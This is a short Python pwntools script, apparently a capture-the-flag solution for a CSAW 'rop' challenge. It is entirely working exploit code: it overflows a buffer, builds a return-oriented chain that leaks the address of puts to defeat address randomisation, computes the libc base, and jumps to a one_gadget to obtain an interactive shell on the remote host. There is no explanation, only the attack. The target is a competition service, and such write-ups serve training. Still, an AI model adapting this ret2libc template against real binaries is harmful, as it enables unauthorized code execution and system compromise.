from pwn import *

r = remote('pwn.chal.csaw.io', 5016)
elf = ELF('rop')
padding = b'\x00' * 40
pop_rdi = 0x400683
payload = padding + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.functions['main'].address)

r.recv()
r.sendline(payload)
leak_puts = r.recvline()

puts = 0x80a30
one_gadget = 0x4f3c2
base = u64(leak_puts[:-1].ljust(8, b'\x00')) - puts

payload = padding + p64(base + one_gadget) + b'\x00' * 0x45
r.recv()
r.sendline(payload)
r.interactive()
r.close()
